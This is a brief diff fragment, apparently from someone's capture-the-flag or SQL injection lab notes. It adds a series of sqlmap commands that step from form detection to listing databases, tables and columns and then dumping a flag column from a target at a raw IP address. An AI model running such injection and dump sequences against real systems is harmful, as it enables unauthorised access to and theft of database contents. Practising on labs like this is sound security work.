@@ -185,7 +185,13 @@
   187  sqlmap -u "http://xiaoxiaoran.com/sqli/Less-11/index.php" --form
 
 	
-	
+
+sqlmap -u http://114.67.246.176:17155/index.php --forms
+sqlmap -u http://114.67.246.176:17155/index.php --forms --dbs
+sqlmap -u http://114.67.246.176:17155/index.php --forms -D skctf --tables
+sqlmap -u http://114.67.246.176:17155/index.php --forms -D skctf -T fl4g --columns
+sqlmap -u http://114.67.246.176:17155/index.php --forms -D skctf -T fl4g -C "skctf_flag" --dump
+
 	
 	
 	
